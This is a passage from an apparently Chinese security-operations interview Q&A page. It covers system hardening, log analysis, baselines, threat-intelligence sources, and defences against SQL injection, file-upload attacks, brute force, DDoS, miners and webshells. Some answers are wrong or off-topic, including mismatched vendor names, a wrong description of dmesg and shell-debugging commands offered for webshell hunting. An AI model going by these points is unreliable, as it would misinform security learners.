安全加固：</p><ol><li>更新所安装的软件包：定期更新系统中所有软件包以修复已知漏洞。</li><li>禁用不必要的服务：禁用不必要的网络服务，减少攻击面。</li><li>配置防火墙：使用防火墙限制入站和出站网络流量，只允许合法的流量通过。</li><li>加强密码策略：设置强密码策略并启用多因素身份验证。</li><li>禁用 root 登录：禁止使用 root 用户登录系统，并将 sudo 和 su 访问权限限制到必要的人员或组。</li><li>使用 SELinux 或 AppArmor：使用 SELinux 或 AppArmor 来实现更细粒度的应用程序和文件访问控制。</li><li>配置 SSH 访问：使用 SSH 协议连接服务器时配置限制 IP 地址和端口号等安全措施。</li><li>定期备份数据：定期备份重要数据至外部存储设备，以防止数据丢失和系统损坏。</li></ol><p>Windows 安全加固：</p><ol><li>更新操作系统和软件：及时安装 Windows 操作系统和软件的安全更新。</li><li>禁用 SMBv1：由于 SMBv1 协议存在一些严重的漏洞，建议禁用 SMBv1 协议。</li><li>启用 UAC：启用用户账户控制（UAC），以限制非管理员用户的系统访问权限。</li><li>配置防火墙：使用 Windows 防火墙过滤不必要的网络流量，并确保只允许合法的流量通过。</li><li>使用 BitLocker 或类似的加密工具：对重要数据和文件进行加密存储，以避免数据泄漏。</li><li>配置组策略：使用本地组策略或 Active Directory 组策略来限制用户和计算机的访问权限。</li><li>检查安全事件日志：定期检查 Windows 安全事件日志，了解系统中发生的任何异常事件。</li><li>定期备份数据：定期备份重要数据至外部存储设备，以防止数据丢失和系统损坏。</li></ol><p>需要注意的是，这些措施只是增强系统安全的一部分，而不能保证系统绝对安全。因此，建议采取多种方法来保护自己的系统和数据。</p><hr><h2 id="windows-日志分析工具"><a href="#windows-日志分析工具" class="headerlink" title="windows 日志分析工具"></a>windows 日志分析工具</h2><ol><li>Event Viewer：Windows 自带的日志管理工具，可以查看和分析 Windows 系统中的各种事件日志。</li><li>Log Parser：一款免费的命令行工具，可以查询和分析日志文件、IIS 日志、Windows 注册表、Active Directory 等数据源。</li><li>Microsoft Message Analyzer：一款强大的网络协议分析工具，可以捕获和分析 Windows 操作系统上的网络流量和事件日志。</li><li>Syslog-ng：一个高性能的日志管理工具，可以帮助用户收集和分析来自不同平台的日志信息。</li><li>Graylog：一款开源的日志管理工具，可以帮助用户收集、存储和分析来自不同来源的日志信息，并提供直观易用的用户界面。</li><li>Splunk：一款商业化的日志管理工具，可以帮助用户实时监控、搜索、分析和可视化来自不同来源的日志信息。</li></ol><p>需要注意的是，在选择日志分析工具时，需要根据自己的需求和实际情况进行选择，并结合相关操作系统和网络知识进行使用。</p><hr><h2 id="Linux-日志分析技巧命令"><a href="#Linux-日志分析技巧命令" class="headerlink" title="Linux 日志分析技巧命令"></a>Linux 日志分析技巧命令</h2><ol><li><p>grep 命令：用于在文本文件中搜索指定的字符串和模式，例如可以使用 grep error /var/log/messages 命令来查找系统日志中的错误信息。</p></li><li><p>tail 命令：实时监视日志文件，并显示最新添加的日志信息，例如可以使用 tail -f /var/log/messages 命令来实时监视系统消息。</p></li><li><p>sed 和 awk 命令：可以用来编辑和处理文本文件，例如可以使用 awk ‘/error/ {print $0}’ /var/log/messages 命令来筛选出包含 error 字符串的日志信息。</p></li><li><p>journalctl 命令：用于查询和查看 systemd 系统日志，例如可以使用 journalctl -u nginx.service 命令来查看 Nginx 服务的日志信息。</p></li><li><p>dmesg 命令：用于打印内核环境变量缓冲区的内容包</p><h2 id="Linux-基线规范"><a href="#Linux-基线规范" class="headerlink" title="Linux 基线规范"></a>Linux 基线规范</h2></li></ol><p>Linux 基线规范是指为了保证 Linux 系统安全性和可靠性，制定的一系列最佳实践和标准化要求。Linux 基线规范通常包括以下几个方面：</p><ol><li>安全加固：禁用不必要的服务、配置防火墙、强化密码策略等。</li><li>用户和权限管理：创建普通用户账号、限制 root 账号访问、使用 sudo 进行授权等。</li><li>日志管理：启用系统日志、日志文件备份和归档、监控日志信息等。</li><li>文件系统和目录结构规范：对重要数据进行加密、使用 ext4 文件系统、分区管理等。</li><li>网络安全：检查网络连接状态、限制入站和出站流量、使用 SELinux 或 AppArmor 等。</li><li>软件更新与安全漏洞修复：定期更新操作系统和软件补丁、及时处理已知漏洞等。</li><li>数据备份与恢复：定期备份和恢复系统数据和设置等。</li></ol><p>需要注意的是，不同的公司或组织可能会有不同的基线规范要求。在实践中，我们可以根据自己的需求和安全风险评估情况，设计并实施相应的基线规范，并定期进行评估和调整。这样可以帮助我们规范化 Linux 系统的管理和维护，并提高系统的可靠性和安全性。</p><hr><h2 id="Windows-安全基线检查"><a href="#Windows-安全基线检查" class="headerlink" title="Windows 安全基线检查"></a>Windows 安全基线检查</h2><p>Windows 安全基线检查是指通过对 Windows 操作系统进行安全配置和最佳实践检查，来评估系统的安全性和完整性。Windows 安全基线包括以下几个方面：</p><ol><li>用户和权限管理：创建普通用户账号、限制管理员账号访问、使用 UAC 进行授权等。</li><li>密码策略：设置强密码策略，并启用多因素身份验证。</li><li>网络安全：配置防火墙、禁用不必要的服务、加密敏感数据传输等。</li><li>软件更新与安全漏洞修复：定期更新操作系统和软件补丁、及时处理已知漏洞等。</li><li>日志管理：启用系统日志、监控日志信息、建立日志归档等。</li><li>文件和目录权限：配置文件系统和目录结构规范、限制文件和目录访问权限等。</li><li>数据备份与恢复：定期备份和恢复系统数据和设置等。</li></ol><p>为了进行 Windows 安全基线检查，可以使用 Microsoft Security Compliance Toolkit 工具，该工具包含安全基线和最佳实践检查工具，并提供安全配置模板和分析报告。此外，还可以使用第三方商业化工具，例如 SolarWinds、McAfee 等，来帮助进行 Windows 安全基线检查。</p><p>需要注意的是，安全基线检查只是评估系统安全性的一部分。为了保证 Windows 系统的安全性和可靠性，还需要采取其他措施，例如定期更新操作系统和软件补丁、加强密码策略、备份数据等。</p><hr><h2 id="中间件基线规范（APACHE）"><a href="#中间件基线规范（APACHE）" class="headerlink" title="中间件基线规范（APACHE）"></a>中间件基线规范（APACHE）</h2><p>Apache 是一款常用的 Web 服务器软件，为了保障其安全可靠地运行，可以制定中间件基线规范。以下是 Apache 中间件基线规范的一些重要措施：</p><ol><li>版本号管理：定期检查并更新 Apache 版本，及时安装最新版本的补丁与安全更新。</li><li>配置文件规范：对 Apache 的配置文件进行规范化和审计，限制网站访问权限、禁止目录浏览等。</li><li>日志管理：启用 Apache 访问日志和错误日志，定期清理日志文件并做好备份、归档等工作。</li><li>安全加固：如禁用不必要的模块、关闭 TRACE 请求响应、限制 HTTP 方法等。</li><li>SSL/TLS 加强：设置 TLS 选项、开启 HSTS、使用证书身份验证等。</li><li>防火墙和反向代理策略：通过防火墙等技术来过滤恶意流量，使用反向代理策略限制直接连接到 Web 服务器的 IP 地址。</li><li>应用安全：对 Web 应用程序进行安全审计，确保程序的漏洞被修复、未受到攻击等。</li></ol><p>需要注意的是，以上这些措施只是 Apache 中间件基线规范的一部分，实际操作中还需要根据具体情况进行评估和调整。同时，要保障 Apache 服务器的安全性和可靠性，还需要定期备份数据、优化性能等工作。</p><hr><h2 id="中间件常见漏洞"><a href="#中间件常见漏洞" class="headerlink" title="中间件常见漏洞"></a>中间件常见漏洞</h2><p>中间件是指应用程序和操作系统之间的软件组件，常见的中间件漏洞有以下几种：</p><ol><li>Web服务器漏洞：针对Web服务器（如Apache、Nginx）的攻击通常包括利用目录遍历、文件包含、SQL注入等技术。</li><li>数据库漏洞：数据库（如MySQL、Oracle、SQL Server）的漏洞通常涉及未授权的访问、SQL注入等方面。</li><li>应用服务器漏洞：应用服务器（如Tomcat、JBoss、WebLogic）的漏洞通常会导致远程执行代码、拒绝服务等问题。</li><li>消息队列漏洞：消息队列（如RabbitMQ、Kafka）的漏洞通常涉及未授权访问、拒绝服务等问题。</li><li>缓存服务器漏洞：缓存服务器（如Redis、Memcached）的漏洞通常包括未授权访问、命令注入等问题。</li><li>中间件配置问题：中间件的错误配置也可能导致安全问题，比如弱密码、不安全的协议配置等。</li></ol><p>需要注意的是，中间件漏洞是日益增多的，因此建议及时更新和修补中间件的安全漏洞。</p><hr><h2 id="常见中间件的配置文件路径知道哪些？"><a href="#常见中间件的配置文件路径知道哪些？" class="headerlink" title="常见中间件的配置文件路径知道哪些？"></a>常见中间件的配置文件路径知道哪些？</h2><p>不同的中间件软件有不同的配置文件路径。以下是几种常见中间件软件的配置文件路径：</p><ol><li>Apache Web 服务器：httpd.conf 文件通常位于 /etc/httpd/ 或者 /usr/local/apache2/conf/ 目录下。</li><li>Nginx Web 服务器：nginx.conf 文件通常位于 /etc/nginx/ 或者 /usr/local/nginx/conf/ 目录下。</li><li>MySQL 数据库：my.cnf 文件通常位于 /etc/mysql/ 或者 /usr/local/mysql/etc/ 目录下。</li><li>PostgreSQL 数据库：postgresql.conf 和 pg_hba.conf 文件通常位于 /var/lib/pgsql/data/ 或者 /etc/postgresql/<version>/main/ 目录下。</version></li><li>Oracle 数据库：initSID.ora 和 listener.ora 文件通常位于 $ORACLE_HOME/dbs/ 目录下。</li><li>Tomcat 应用服务器：server.xml、context.xml 和 web.xml 文件通常位于 /conf/ 目录下。</li><li>JBoss 应用服务器：standalone.xml 和 standalone-full.xml 文件通常位于 /standalone/configuration/ 目录下。</li></ol><p>需要注意的是，这些路径可能会根据不同的操作系统而有所不同，并且也会随着中间件版本的更新而变化。因此，在进行中间件配置时，建议查询官方文档或参考相关文献以获取最新的配置文件路径信息。</p><hr><h2 id="常用的安全工具以及常见的设备有哪些？"><a href="#常用的安全工具以及常见的设备有哪些？" class="headerlink" title="常用的安全工具以及常见的设备有哪些？"></a>常用的安全工具以及常见的设备有哪些？</h2><p>常用的安全工具和设备有很多，以下是其中一些常见的：</p><ol><li>防火墙（Firewall）：防火墙可以过滤网络流量，保护网络不受外部攻击。常见的防火墙包括硬件防火墙和软件防火墙。</li><li>入侵检测系统（Intrusion Detection System, IDS）：IDS 可以监控网络流量、检测恶意行为和入侵事件，并向管理员发出警报。</li><li>入侵防御系统（Intrusion Prevention System, IPS）：IPS 可以在 IDS 的基础上主动预防入侵事件，并进行自动化响应。</li><li>统一威胁管理平台（Unified Threat Management, UTM）：UTM 是一种集成了防火墙、IDS/IPS、VPN、反病毒等多种功能的综合性安全解决方案。</li><li>脆弱性扫描器（Vulnerability Scanner）：脆弱性扫描器可以发现系统中可能存在的漏洞，并提供修补建议。</li><li>安全信息和事件管理系统（Security Information and Event Management, SIEM）：SIEM 可以对安全事件和日志数据进行收集、分析和报告，帮助管理员更好地了解和响应安全事件。</li><li>代理服务器（Proxy Server）：代理服务器可以过滤流量、检查内容和访问控制，提供额外的安全保护。</li><li>负载均衡器（Load Balancer）：负载均衡器可以平衡网络流量，分担服务器负载，提高网络性能和可用性。</li><li>加密设备：加密设备可以对数据进行加密处理，防止数据被窃取或篡改。</li></ol><p>需要注意的是，以上只是其中一些常见的安全工具和设备，实际应用中还有很多其他的安全工具和设备。在选择和使用安全工具和设备时，需要根据具体情况进行评估和选择，并确保其符合实际需求和安全标准。</p><hr><h2 id="你知道的威胁情报库有哪些？"><a href="#你知道的威胁情报库有哪些？" class="headerlink" title="你知道的威胁情报库有哪些？"></a>你知道的威胁情报库有哪些？</h2><ol><li>银河麒麟（ThreatBook）：银河麒麟是国内领先的网络安全威胁情报服务提供商，其威胁情报库包括恶意软件、攻击源IP、域名等方面的信息。</li><li>国家互联网应急中心（CNCERT）：CNCERT 是中国政府统一组织和协调全国互联网安全工作的部门，其威胁情报库包括漏洞、恶意代码、攻击事件等方面的信息。</li><li>安恒威胁情报中心（ATIS）： ATIS 是安恒信息安全研究院旗下的威胁情报中心，其威胁情报库涵盖了APT攻击、Web攻击、恶意邮件、移动恶意软件等方面的信息。</li><li>漏洞盒子（KnownSec）：漏洞盒子是一家致力于网络安全防御和攻防技术研究的公司，其威胁情报库包括漏洞、恶意代码等方面的信息。</li><li>360威胁情报中心（360 TI Center）：360 威胁情报中心聚焦于威胁情报、安全事件响应和恶意代码研究等领域，其威胁情报库包括APT攻击、恶意URL等方面的信息。</li></ol><p>需要注意的是，以上威胁情报库只是其中一部分，实际应用中还有很多其他的威胁情报库。在使用威胁情报库时，需要根据具体需求进行评估和选择，并确保数据来源可靠、及时和准确。</p><hr><h2 id="怎么发现有没有被攻击？"><a href="#怎么发现有没有被攻击？" class="headerlink" title="怎么发现有没有被攻击？"></a>怎么发现有没有被攻击？</h2><p>发现自己是否被攻击是网络安全管理中非常重要的一环。以下是几种常见的发现被攻击的方法：</p><ol><li>安全日志监控：对系统和应用程序的安全日志进行监控，可以及时发现异常活动和安全事件。例如，登录失败、异常访问、恶意软件入侵等。</li><li>网络流量分析：通过对网络流量进行监控和分析，可以发现可能存在的攻击行为。例如，大量来自某个 IP 地址或特定端口的流量、恶意脚本和代码注入等。</li><li>主机基线监测：通过对应用程序、操作系统和数据文件等资源进行基线监测，可以及时发现可能存在的异常变化和不正常的活动。</li><li>脆弱性扫描：通过使用脆弱性扫描工具，可以发现系统中可能存在的漏洞，并提供修补建议。</li><li>威胁情报监测：通过使用威胁情报库和服务，可以了解到当前存在的威胁活动，及时采取防御措施。</li><li>安全演练：通过进行安全演练，可以模拟真实的攻击场景，评估自身的安全状态，及时发现和修复存在的问题。</li></ol><p>需要注意的是，以上方法只是其中一部分，实际应用中还有很多其他的发现被攻击的方法。在进行网络安全管理时，需要综合使用多种方法，并不断更新和完善自身的防御措施，以提高安全水平和减少被攻击的风险。</p><hr><h2 id="SQL-注入如何进行检测"><a href="#SQL-注入如何进行检测" class="headerlink" title="SQL 注入如何进行检测"></a>SQL 注入如何进行检测</h2><ol><li>数据库异常日志：在数据库服务器上查看异常日志或错误日志，如果发现异常 SQL 语句，或者 SQL 语句中包含可疑代码或关键字，就可能存在 SQL 注入攻击。</li><li>应用服务器日志：在应用服务器上查看访问日志或错误日志，如果发现访问异常、错误码增多，或者包含可疑的 URL 参数等信息，也可能表明存在 SQL 注入攻击。</li><li>漏洞扫描工具：使用专业的漏洞扫描工具，可以自动化地检测应用程序中可能存在的 SQL 注入漏洞，并提供修补建议。</li><li>安全审计：通过记录用户行为和操作日志，可以检测和追踪可能存在的 SQL 注入攻击。</li><li>手动测试：模拟攻击者的行为，手动输入特定的 SQL 语句或注入代码，来验证是否存在 SQL 注入漏洞。</li></ol><p>需要注意的是，以上方法只是其中一部分，实际应用中还有很多其他的 SQL 注入检测方法。在进行 SQL 注入检测时，需要综合使用多种方法，并不断更新和完善自身的防御措施，以提高安全水平和减少被攻击的风险。同时，如果确实发现了 SQL 注入攻击，应及时采取措施来修复漏洞并保护数据库中的数据。</p><hr><h2 id="Sql-注入加固措施？"><a href="#Sql-注入加固措施？" class="headerlink" title="Sql 注入加固措施？"></a>Sql 注入加固措施？</h2><p>为了防止 SQL 注入攻击，可以采取以下一些常见的加固措施：</p><ol><li>输入验证：对用户输入数据进行验证和过滤，特别是对单引号、双引号、分号等特殊字符进行处理。可以使用输入过滤函数或正则表达式等方式来实现。</li><li>参数化查询：使用参数化查询操作数据库，可以将用户输入的数据视为参数而不是 SQL 代码的一部分，从而避免 SQL 注入攻击。</li><li>最小化权限原则：在应用程序连接数据库时，给予最小必要的权限，并严格控制数据库访问权限，以减少攻击者利用 SQL 注入漏洞获取敏感信息的可能性。</li><li>安全编码标准：在开发应用程序时，遵循安全编码标准，避免使用拼接 SQL 语句的方式，而是采用参数化查询等安全方式来操作数据库。</li><li>异常信息处理：在应用程序中添加异常处理机制，可以及时捕获和记录 SQL 注入攻击产生的异常信息，便于管理员及时发现和修复问题。</li><li>安全审计：通过记录用户行为和操作日志，可以检测和追踪可能存在的 SQL 注入攻击。</li></ol><p>需要注意的是，以上只是其中一部分常见的 SQL 注入加固措施，针对不同的应用和场景，可能需要采用不同的加固措施。在进行 SQL 注入防御时，需要综合考虑多种因素，并不断更新和完善自身的防御措施，以提高安全水平并减少被攻击的风险。</p><hr><h2 id="文件上传和命令执行，有看过相关日志吗？"><a href="#文件上传和命令执行，有看过相关日志吗？" class="headerlink" title="文件上传和命令执行，有看过相关日志吗？"></a>文件上传和命令执行，有看过相关日志吗？</h2><p>文件上传和命令执行都是常见的 Web 应用程序安全漏洞，攻击者利用漏洞上传恶意文件或执行恶意代码，从而获取服务器上的敏感数据或控制服务器。在进行安全管理时，通常可以通过查看相关日志来发现潜在的安全威胁。</p><p>对于文件上传漏洞，以下是一些可能存在的相关日志：</p><ol><li>文件上传日志：Web 服务器或应用服务器上的访问日志中可能包含上传文件的信息，例如上传时间、上传文件名称、上传文件大小等。</li><li>访问控制日志：如果应用程序实现了文件上传的访问控制机制，记录访问控制的日志可能包含了上传文件的信息，例如上传人员、上传时间、上传 IP 地址等。</li><li>安全审计日志：如果使用了安全审计工具，可以记录文件上传操作的详细信息，例如上传文件的路径、上传文件的内容等。</li></ol><p>对于命令执行漏洞，以下是一些可能存在的相关日志：</p><ol><li>访问日志：Web 服务器或应用服务器上的访问日志中可能包含恶意代码执行的信息，例如请求 URL、HTTP 请求方法、HTTP 状态码等。</li><li>异常日志：应用程序中的异常日志可以记录可能存在的恶意代码执行异常信息，例如异常类型、异常堆栈等。</li><li>安全审计日志：如果使用了安全审计工具，可以记录恶意代码执行的详细信息，例如恶意代码的来源、执行时间、执行结果等。</li></ol><p>需要注意的是，以上只是其中一部分可能存在的相关日志，实际应用中还有更多可能的日志类型。在进行文件上传和命令执行漏洞的检测和防御时，需要根据具体应用进行评估和选择，并及时发现和修复潜在的安全威胁。</p><hr><h2 id="你能说明文件上传的原理吗？"><a href="#你能说明文件上传的原理吗？" class="headerlink" title="你能说明文件上传的原理吗？"></a>你能说明文件上传的原理吗？</h2><p>当用户上传文件时，通常需要通过 HTTP 或 HTTPS 协议将文件传输到 Web 服务器。文件上传的原理可以简单地描述为：</p><ol><li>客户端向服务器发送一个包含文件数据的 POST 请求。</li><li>服务器接收请求并解析其中的文件数据。</li><li>服务器将文件保存在指定的目录下，并返回处理结果给客户端。</li></ol><p>具体来说，文件上传流程一般如下：</p><ol><li>用户在 Web 页面上选择要上传的文件，并提交表单。</li><li>浏览器将表单中的数据进行编码并作为 POST 请求发送给 Web 服务器。</li><li>Web 服务器接收到请求后，会解析请求参数，获取上传的文件数据。</li><li>服务器对上传的文件进行校验和过滤，例如检查文件格式、大小、类型等，防止上传恶意文件。</li><li>如果上传的文件符合要求，则将文件存储在指定的位置，如果不符合要求，则拒绝上传并返回错误信息。</li><li>服务器返回上传结果给客户端，告知用户文件是否上传成功。</li></ol><p>需要注意的是，文件上传涉及到的安全问题较多，例如上传的文件可能会包含病毒、木马等恶意程序，攻击者可能会利用上传漏洞上传恶意文件，从而导致服务器被控制。因此，在进行文件上传功能开发时，需要仔细考虑安全问题，并采取相应的防御措施，例如限制上传文件大小、过滤不安全的文件类型等。</p><hr><h2 id="文件上传攻击特征？"><a href="#文件上传攻击特征？" class="headerlink" title="文件上传攻击特征？"></a>文件上传攻击特征？</h2><p>文件上传攻击是指攻击者通过网站上的文件上传功能，上传恶意文件来执行攻击。以下是一些文件上传攻击的特征：</p><ol><li>文件类型绕过：攻击者可能会尝试上传不受支持的文件类型，或者将文件类型伪装成其他类型，以绕过文件类型检查。</li><li>文件名欺骗：攻击者可能会使用诱人的文件名称来欺骗用户下载或打开恶意文件。</li><li>文件内容：上传的文件可能包含恶意代码、木马、病毒等恶意程序，这些程序可被用于攻击和控制目标系统。</li><li>大小限制绕过：攻击者可能会尝试绕过文件大小的限制，上传超过规定大小的文件。</li><li>目录遍历：攻击者可能会通过在文件名中插入../等字符来遍历目标服务器上的目录，获取敏感信息或执行攻击。</li></ol><p>如果您担心自己的网站可能会受到文件上传攻击，请确保实施足够的安全措施，如限制上传文件类型、大小和数量、对上传的文件进行检查、将上传的文件保存在安全的位置，并为所有上传的文件生成一个唯一的文件名。</p><h2 id="文件上传加固方法？"><a href="#文件上传加固方法？" class="headerlink" title="文件上传加固方法？"></a>文件上传加固方法？</h2><p>以下是保护您的网站免受文件上传攻击的一些方法：</p><ol><li>文件类型和大小限制：在服务器端对上传的文件进行检查，确保上传的文件类型、大小和数量符合预期。可以使用白名单方式进行限制，只允许上传特定类型的文件。</li><li>检查文件内容：在服务器端对上传的文件进行检查，确保它们不包含恶意代码或病毒等危险内容。可以使用杀毒软件或安全扫描工具来帮助检查上传的文件。</li><li>重命名文件：将上传的文件保存在一个新的随机生成的文件名下，而不是使用用户提供的文件名。这样可以避免攻击者通过伪造文件名来欺骗用户。</li><li>存储位置：将上传的文件保存在与网站主目录分离的位置上，以避免攻击者上传Webshell等恶意脚本，并能够防止攻击者直接访问上传的文件。</li><li>使用安全上传类库：使用安全的上传类库或框架，如Apache Commons FileUpload、SecureFileUploader等。</li><li>HTTPS加密：在传输过程中使用HTTPS协议加密，以避免数据在传输过程中被窃听或篡改。</li><li>日志审计：记录所有的文件上传操作并定期审计日志，以便发现异常上传行为，及时采取措施。</li></ol><p>总之，防止文件上传攻击需要综合考虑多种因素，包括文件类型、大小、内容、存储位置、传输方式等，同时定期进行安全审计，并且对于应用程序代码的编写需要充分考虑安全因素。</p><h2 id="暴力破解加固方法？"><a href="#暴力破解加固方法？" class="headerlink" title="暴力破解加固方法？"></a>暴力破解加固方法？</h2><p>以下是一些保护您的网站免受暴力破解攻击的方法：</p><ol><li>密码策略：实施强密码策略，建议用户使用包含大写字母、小写字母、数字和特殊字符等不同类型字符组成的复杂密码，并设置密码长度要求。</li><li>账户锁定：限制密码尝试次数，并在多次失败后自动锁定账户。同时，应该通过邮件或短信通知用户他们的账户已被锁定，以防止攻击者对其进行进一步攻击。</li><li>人机验证：在登录页面引入验证码或其他形式的人机验证，以防止自动化破解程序的攻击。</li><li>访问控制：实施访问控制策略，限制只有授权用户才能够访问敏感信息或功能。而且还应该限制来自未知来源或具有恶意行为的IP地址的访问。</li><li>强制退出：如果用户长时间没有活动，应强制退出登录状态，以防止攻击者通过利用未注销的会话进行攻击。</li><li>检测异常行为：检测异常登录行为，如从异常地区或设备登录，或频繁更改登录IP地址等。</li><li>安全日志审计：监控并记录登录事件，并对日志进行审计和分析，以便及时发现异常行为并采取措施。</li></ol><p>总之，在防止暴力破解攻击方面，需要综合考虑多种因素，包括密码策略、账户锁定、人机验证、访问控制、强制退出、检测异常行为等。同时，应保持应用程序的更新，及时修补安全漏洞，以确保系统的完整性和安全性。</p><h2 id="DDOS-CC等攻击应急思路以及如何防范"><a href="#DDOS-CC等攻击应急思路以及如何防范" class="headerlink" title="DDOS CC等攻击应急思路以及如何防范"></a>DDOS CC等攻击应急思路以及如何防范</h2><p>DDoS（分布式拒绝服务攻击）和 CC（HTTP）攻击是目前比较普遍的网络攻击方式之一。以下是应急响应思路以及如何防范这些攻击的建议：</p><ol><li>应急响应思路</li></ol><p>在受到DDoS和CC攻击时，应采取以下措施来降低攻击对系统的影响：</p><ul><li>快速检测并确认攻击类型和攻击源；</li><li>提高带宽和资源利用率，以提供更强的承载能力；</li><li>实施流量清洗、流量限制和IP封堵等措施，清除恶意攻击流量；</li><li>配合 ISP 进行攻击源 IP 的追踪和协助；</li><li>在攻击持续期间，保持实时监控和跟进，随时更新应急响应策略。</li></ul><ol><li>如何防范</li></ol><p>为了预防DDoS和CC攻击，可以采取以下方法：</p><ul><li>增加网络带宽，并提高硬件设备的承载能力，以抵御较小规模的攻击；</li><li>实现DDoS和CC攻击的检测和防御机制，如基于流量和行为的检测技术和防御技术；</li><li>确保服务器和网站软件及时更新，以弥补已知漏洞；</li><li>实施流量清洗、流量限制和IP封堵等措施；</li><li>配置合理的防火墙规则和入侵检测系统（IDS）等安全设备；</li><li>加强网络安全教育，提高用户密码安全性，并定期对敏感数据进行备份和加密。</li></ul><p>总之，在防范DDoS和CC攻击方面，需要综合考虑多种因素，包括增加带宽、提高硬件承载能力、实现攻击检测和防御机制、确保服务器和网站软件及时更新、加强网络安全教育等。同时，应该建立完善的应急响应机制和紧急处理预案，以做好应急响应准备和快速响应。</p><h2 id="挖矿病毒判断以及处理方式"><a href="#挖矿病毒判断以及处理方式" class="headerlink" title="挖矿病毒判断以及处理方式"></a>挖矿病毒判断以及处理方式</h2><p>挖矿病毒是指利用受感染的计算机进行加密货币挖矿的恶意软件。以下是判断和处理挖矿病毒的一些方法：</p><ol><li>判断挖矿病毒</li></ol><p>通过以下迹象可以判断计算机是否被感染了挖矿病毒：</p><ul><li>计算机运行速度变慢，CPU占用率高；</li><li>电脑风扇声音变大，温度升高；</li><li>安全软件报告未知病毒或恶意软件；</li><li>系统出现闪退或死机等异常情况。</li></ul><ol><li>处理方式</li></ol><p>如果怀疑计算机已经被感染了挖矿病毒，可以采取以下措施：</p><ul><li>及时更新杀毒软件，并开启实时保护模式；</li><li>扫描整个系统，清除所有恶意文件和注册表项；</li><li>禁止不明程序自启动，及时关闭被感染的进程；</li><li>在安装软件时仔细阅读许可协议，禁止安装未知来源的软件；</li><li>加强账户权限管理，限制非管理员用户对系统的操作权限；</li><li>及时备份重要文件，以便在恶意软件攻击后恢复数据。</li></ul><p>总之，在处理挖矿病毒方面，需要及时发现和清除感染，并加强系统的安全防护措施，如升级杀毒软件、限制非管理员用户权限、备份重要文件等。同时，也需要加强网络安全教育，提高用户对于计算机安全的意识和防范能力。</p><h2 id="服务器存在-webshell，如何处理？"><a href="#服务器存在-webshell，如何处理？" class="headerlink" title="服务器存在 webshell，如何处理？"></a>服务器存在 webshell，如何处理？</h2><p>Webshell是一种Web服务器上的恶意代码，可以使攻击者远程控制服务器，并执行各种命令、上传下载文件等操作。以下是处理服务器存在Webshell的一些方法：</p><ol><li>扫描和确认Webshell</li></ol><p>可以通过查看Web服务器日志或使用安全扫描工具来确认是否存在Webshell。找出所有可疑文件并进行彻底检查，以确定是否存在Webshell。</p><ol><li>删除Webshell</li></ol><p>如果确定存在Webshell，需要立即将其删除，并对系统进行全面清理。删除Webshell时，应同时清除与Webshell相关的文件和目录，并且应用程序代码也需要进行更新和修复。</p><ol><li>加强安全防护措施</li></ol><p>为了避免服务器再次被感染，需要加强安全防护措施，包括加强服务器的监控和日志审计、安装杀毒软件并定期更新、限制非管理员用户权限等。</p><ol><li>修改密码</li></ol><p>修改服务器管理员的账户密码，并确保强密码策略得到实施，建议使用包含大写字母、小写字母、数字和特殊字符等不同类型字符组成的复杂密码，并设置密码长度要求。</p><ol><li>更新和修复应用程序代码</li></ol><p>Webshell通常是由于应用程序存在漏洞或安全问题而被植入的。因此，为了防止类似问题再次发生，需要及时更新并修复应用程序代码中的安全漏洞。</p><p>总之，在处理服务器存在Webshell的问题时，需要快速准确地识别和清除Webshell，并加强服务器和应用程序的安全防护措施。同时，也需要定期进行巡检和审计，及时发现和排除漏洞，以确保系统的完整性和安全性。</p><h2 id="排查-shell-应该用什么命令来进行排查？"><a href="#排查-shell-应该用什么命令来进行排查？" class="headerlink" title="排查 shell 应该用什么命令来进行排查？"></a>排查 shell 应该用什么命令来进行排查？</h2><p>要排查 shell 的问题，可以使用以下命令：</p><ol><li><code>echo</code>：用于打印变量或字符串，可以用来检查变量的值是否正确。</li><li><code>set</code>：用于显示所有的 shell 变量和函数，包括环境变量。</li><li><code>env</code>：用于显示当前 shell 环境下的所有环境变量。</li><li><code>source</code> 或 <code>.</code>：用于读取并执行指定文件中的命令，通常用于重新加载配置文件。</li><li><code>sh -x script.sh</code>：用于以调试模式执行脚本，并输出每个执行的命令及其参数。</li><li><code>ps</code>：用于列出当前正在运行的进程，可以使用 <code>ps aux</code> 查看详细信息。</li><li><code>top</code>：用于实时查看系统资源的使用情况，可以用来定位占用 CPU 或内存过高的进程。</li><li><code>grep</code>：用于搜索指定的文本内容，可以用来查找特定日志文件中的错误信息等。</li></ol><p>这些命令可以帮助您快速诊断 shell 中的问题。</p><h2 id="如何检测-webshell？"><a href="#如何检测-webshell？" class="headerlink" title="如何检测 webshell？"></a>如何检测 webshell？</h2><p>Webshell是指嵌入到Web服务器上的一种命令执行环境，可以通过Web页面或HTTP协议与其进行交互，攻击者可以利用Webshell来执行各种恶意操作。检测Webshell可以使用以下几种方法：</p><ol><li>查看Web服务器访问日志：Webshell通常会产生异常的网络流量，例如向非标准端口发送POST请求等。查看Web服务器的访问日志，观察是否存在异常的请求。</li><li>安全扫描工具：使用安全扫描工具对Web服务器进行扫描，以检测是否存在Webshell。常用的安全扫描工具包括Nessus、OpenVAS等。</li><li>文件监控：Webshell通常会将恶意代码写入某个文件中，因此可以通过文件监控工具来检测Webshell。例如，当文件被修改时，文件监控工具会立即发送警报。</li><li>内存监控：有些高级的Webshell可能不会在磁盘上留下任何痕迹，而是直接将代码注入到内存中。因此，可以使用内存监控工具来检测是否存在Webshell。</li><li>安全审计：对Web服务器进行安全审计，检查是否存在安全漏洞，例如文件上传漏洞、命令注入漏洞等。攻击者通常会利用这些漏洞来上传Webshell。</li></ol><p>以上方法并不能完全保证检测到所有的Webshell，因此建议在Web服务器上部署安全防护解决方案，定期进行安全扫描和审核，并及时更新软件补丁。</p><h2 id="一台主机在内网进行横向攻击，你应该怎么做？"><a href="#一台主机在内网进行横向攻击，你应该怎么做？" class="headerlink" 